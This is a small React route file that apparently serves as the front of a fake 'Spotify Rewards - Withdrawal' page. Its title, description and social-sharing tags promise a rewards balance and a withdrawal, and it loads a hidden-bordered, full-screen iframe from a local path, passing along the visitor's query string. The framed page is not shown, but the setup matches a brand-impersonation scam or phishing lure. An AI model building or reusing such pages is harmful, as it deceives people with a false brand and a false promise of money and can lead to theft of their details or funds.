import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";


export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: "Spotify Rewards - Withdrawal" },
      {
        name: "description",
        content: "Check your Spotify Rewards balance and request your withdrawal.",
      },
      { property: "og:title", content: "Spotify Rewards - Withdrawal" },
      {
        property: "og:description",
        content: "Check your Spotify Rewards balance and request your withdrawal.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  component: SpotifyPage,
});

function SpotifyPage() {
  const [search, setSearch] = useState("");

  useEffect(() => {
    setSearch(window.location.search);
  }, []);

  return (
    <iframe
      src={`/sp/type/index.html${search}`}
      title="Spotify Rewards"
      style={{
        position: "fixed",
        inset: 0,
        width: "100%",
        height: "100%",
        border: "none",
      }}
    />
  );
}
